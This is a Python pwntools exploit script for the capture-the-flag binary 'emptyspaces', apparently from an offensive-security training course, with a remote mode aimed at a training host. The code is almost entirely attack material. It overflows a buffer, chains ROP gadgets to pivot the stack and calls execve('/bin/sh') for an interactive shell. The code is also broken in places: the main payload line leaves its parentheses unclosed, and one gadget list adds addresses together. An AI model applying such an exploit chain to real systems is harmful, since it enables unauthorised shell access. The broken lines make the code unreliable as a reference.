from pwn import *
import time
import subprocess
import sys
from functools import reduce



def print_red(str):
	print("\033[91m" + str + "\033[0m")

def genbin(binary_name):
	command = f"genbin ~/challenges/playroom/shellcodes/{binary_name}"
	try:
		return bytes.fromhex(subprocess.check_output(command, shell=True, universal_newlines=True))
	except (subprocess.CalledProcessError, ValueError) as e:
		print(f"An exception occurred: {e}")
		exit(-1)

def rop_chain(chain):
    for i in range(len(chain)):
        chain[i] = p64(chain[i])
    return reduce(lambda x, y: x + y, chain)

context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = "error"

#breakpoints
end_main = 0x400c0e

#pointers to data
buffer = 0x6bb2e0

# pointers to functions
read_text = 0x4497b0

# gadgets
pop_rsp = 0x401da3
pop_rsi = 0x410133
pop_rdx = 0x4497c5
pop_rdx_rsi = 0x44bd59
pop_rdi = 0x400696
pop_rax = 0x4155a4
push_rsp = 0x450a84
syscall = 0x40128c
ret = 0x400416

#ROPchain
read8 = [pop_rdi, 0x00, pop_rdx_rsi, 0x08, buffer, read_text]
read256 = [pop_rdi, 0x00, pop_rdx_rsi, 0x100, buffer, read_text]
mov_rsp = [pop_rsp + buffer + ret]
execve = [pop_rax, 0x3b, pop_rdx_rsi, 0x00, 0x00, pop_rdi, buffer, syscall]


if args["REMOTE"]:
	r = remote("bin.training.offdef.it", 4006)
else:
	r = process("./emptyspaces")
	gdb.attach(r, f"""
	b *{end_main}
	unset env
	set disable-randomization off
	c
	""")

input("wait")
time.sleep(0.5)
r.send(b"a"*72 + rop_chain(read256 + [pop_rsp]
time.sleep(0.2)
r.send(rop_chain(read8 + execve))
time.sleep(0.2)
r.send(b"/bin/sh\x00")
time.sleep(0.2)
r.interactive()
